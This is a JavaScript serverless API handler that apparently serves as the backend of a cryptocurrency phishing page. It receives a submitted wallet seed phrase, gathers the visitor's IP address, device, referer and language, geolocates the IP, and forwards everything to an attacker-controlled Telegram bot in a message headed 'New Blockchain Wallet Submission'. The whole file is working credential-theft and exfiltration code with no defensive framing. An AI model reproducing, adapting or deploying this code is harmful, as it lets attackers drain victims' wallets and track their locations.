export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { phrase } = req.body;
  if (!phrase) return res.status(400).json({ error: "No phrase" });

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return res.status(500).json({ error: "Telegram not configured" });
  }

  // Get visitor info
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.socket?.remoteAddress ||
    "Unknown";

  const userAgent = req.headers["user-agent"] || "Unknown";
  const referer = req.headers["referer"] || "Direct";
  const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
  const now = new Date();
  const time = now.toUTCString();

  // Lookup country from IP
  let country = "Unknown";
  let city = "Unknown";
  try {
    const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,regionName`);
    const geoData = await geo.json();
    country = geoData.country || "Unknown";
    city = `${geoData.city || ""}${geoData.regionName ? ", " + geoData.regionName : ""}`;
  } catch (_) {}

  const message =
    `🔐 <b>New Blockchain Wallet Submission</b>\n\n` +
    `🕐 <b>Time:</b> ${time}\n` +
    `🌍 <b>Country:</b> ${country}\n` +
    `🏙️ <b>City:</b> ${city}\n` +
    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
    `🔗 <b>Referer:</b> ${referer}\n` +
    `🗣️ <b>Language:</b> ${lang}\n` +
    `📱 <b>Device:</b> ${userAgent}\n\n` +
    `🔑 <b>Seed Phrase:</b>\n<code>${phrase}</code>`;

  const telegramRes = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    }
  );

  const telegramData = await telegramRes.json();

  if (!telegramData.ok) {
    return res.status(500).json({ error: "Telegram send failed", detail: telegramData });
  }

  return res.status(200).json({ ok: true });
}
